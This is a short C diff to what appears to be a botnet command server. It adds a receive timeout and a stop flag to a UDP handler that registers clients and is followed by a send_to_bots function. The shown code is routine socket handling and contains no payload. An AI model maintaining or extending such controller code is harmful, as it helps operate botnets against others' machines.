@@ -2,6 +2,7 @@
 
 extern CONNS cons;
 extern int main_sock;
+extern char STOPFLAG;
 
 int make_socket(void)
 {
@@ -17,6 +18,8 @@ void *accept_handler(void)
 {
 	struct connections *connects = &cons;
 	char temp[10];
+	struct timeval timeout={4,0};
+	setsockopt(main_sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(struct timeval));
 	while(1){
 		int addrlen = sizeof(struct sockaddr);
 		if(recvfrom(main_sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
@@ -26,10 +29,13 @@ void *accept_handler(void)
 			sendto(main_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
 			connects->sock = make_socket();
 			connects = connects->next;
+		}else{
+			if(STOPFLAG){
+				pthread_exit(0);
+			}
 		}
 
 	}
-	pthread_exit(0);
 }
 
 void send_to_bots(char *data)
